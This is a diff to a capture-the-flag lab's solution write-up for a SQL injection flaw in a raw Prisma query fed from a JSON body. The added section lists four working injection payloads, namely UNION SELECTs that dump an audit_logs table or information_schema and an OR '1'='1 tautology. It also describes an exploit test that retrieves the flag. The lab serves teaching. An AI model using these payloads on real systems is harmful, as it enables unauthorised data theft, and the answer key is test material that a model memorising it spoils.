@@ -1,5 +1,7 @@
 # Solution — sqli-json-body-prisma-raw
 
+> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 · **CVE:** N/A — this lab teaches the vulnerability class, not a specific product CVE.
+
 ## What tipped you off
 
 A normal `POST /api/reports` with `{"filter":{"status":"open"}}` returns rows
@@ -77,6 +79,19 @@ POST /solve   {"id": <secret>}   ->   {"flag":"FLAG{...}"}
 `tests/exploit.py` performs exactly this — one request to leak the id, one to
 solve — and asserts the flag matches the HMAC-derived expected value. It is
 deterministic and finishes in well under 5 seconds.
+
+### Alternative payload vectors
+
+The `status` value is concatenated (never bound), so several equivalent shapes reach
+the hidden table — at least three of them land the flag:
+
+1. **Targeted UNION** (used above): `zzz' UNION SELECT id, action, detail FROM audit_logs WHERE action = 'FLAG_ISSUE' -- `
+2. **Full-table UNION**, then pick the row client-side: `zzz' UNION SELECT id, action, detail FROM audit_logs -- `
+3. **Schema recon** to discover the hidden table/columns first: `zzz' UNION SELECT table_name, column_name, 'x' FROM information_schema.columns -- `
+4. **Tautology recon** to prove concatenation (returns every report): `zzz' OR '1'='1`
+
+Vectors 1–3 exfiltrate `audit_logs`; vector 4 is a fast confirmation that `status`
+is spliced in as code, not bound as a value.
 
 ### Note on Postgres 64-bit integers
 
